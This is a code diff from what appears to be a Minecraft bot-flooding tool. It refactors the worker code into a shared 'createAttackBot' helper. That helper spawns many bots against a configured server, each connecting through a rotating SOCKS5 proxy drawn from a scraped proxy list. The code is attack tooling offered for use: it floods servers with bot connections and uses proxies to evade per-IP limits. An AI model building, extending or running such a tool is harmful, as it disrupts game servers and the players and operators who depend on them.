@@ -5,20 +5,8 @@ import os from 'os'
 import { SocksClient } from 'socks'
 import { getRandomArbitrary, shuffleArray, sleep } from 'emberutils'
 import ProxyScraper from '../utils/proxy-scrape'
-import { server, username } from '../config.json'
-
-function log (text: string) {
-  if (wt.isMainThread || wt.parentPort == null) {
-    console.log(`[${'M0'.green}] [${new Date().toLocaleString()}] ${text}`)
-  } else {
-    wt.parentPort.postMessage({
-      date: new Date().getTime(),
-      displayDate: new Date().toLocaleString(),
-      id: process.argv[3],
-      log: { message: text }
-    })
-  }
-}
+import { server, username, port } from '../config.json'
+import {createAttackBot, log} from './shared'
 
 const amount = {
   workers: 10,
@@ -94,7 +82,6 @@ if (wt.isMainThread) {
     const spaceRegex = /\s{2,}/gm
     const array = process.argv[2].split(',')
     const host = server
-    const port = 25565
     shuffleArray(array)
 
     const proxyArray = shuffleArray(process.argv[4].split(','))
@@ -110,63 +97,16 @@ if (wt.isMainThread) {
           // Don't continue until timeout ends
           await sleep(timeout)
         }
-        // if using proxies
-        if (useProxy) {
-          return createMinecraftBot({
-          // minimise render distance for less ram usage
-            viewDistance: 'tiny',
-            username: username,
-            host: host,
-            port: port,
-            // disable physics
-            physicsEnabled: false,
-            connect: (client) => {
-              SocksClient.createConnection({
-                proxy: {
-                  host: proxyArray[proxyI].split(':')[0],
-                  port: parseInt(proxyArray[proxyI].split(':')[1]),
-                  type: 5
-                },
-                command: 'connect',
-                destination: {
-                  host: host,
-                  port: port
-                }
-              }).then((info) => {
-                client.setSocket(info.socket)
-                client.emit('connect')
-              }).catch(err => {
-                // connection times out
-                if (err.toString().includes('ETIMEDOUT') || err.toString().includes('Proxy connection timed out')) log(`[${username}] Proxy timed out`.bgRed)
-                // closed socket
-                else if (err.toString().includes('Socket closed')) log(`[${username}] Proxy socket closed`.bgRed)
-                // reset connection
-                else if (err.toString().includes('ECONNRESET')) log(`[${username}] Proxy connection reset`.bgRed)
-                // connection refused
-                else if (err.toString().includes('ECONNREFUSED') || err.toString().includes('ConnectionRefused')) log(`[${username}] Proxy connection refused`.bgRed)
-                // proxy auth failed (if proxy is protected by username:password)
-                else if (err.toString().includes('Authentication failed')) log(`[${username}] Proxy authentication failed`.bgRed)
-                // not socks5
-                else if (err.toString().includes('Received invalid Socks5 initial handshake')) log(`[${username}] Received invalid Socks5 initial handshake`.bgRed)
-                // 7b7t issue
-                else if (err.toString().includes('HostUnreachable')) log(`[${username}] Host unreachable`.bgRed)
-                // I forgot when this happens 💀
-                else if (err.toString().includes('Failure')) log(`[${username}] Failure`.bgRed)
-                // unknown error
-                else console.log(err)
-              })
-            },
-            loadInternalPlugins: false
-          })
-        } else {
-          return createMinecraftBot({
-            viewDistance: 'tiny',
-            username: username,
-            host: host,
-            port: port,
-            physicsEnabled: false
-          })
-        }
+
+        return createAttackBot({
+          username: username,
+          host: host,
+          port: port,
+          proxy: useProxy ? {
+            proxyHost: proxyArray[proxyI].split(':')[0],
+            proxyPort: parseInt(proxyArray[proxyI].split(':')[1])
+          } : undefined
+        })
       }
 
       i++
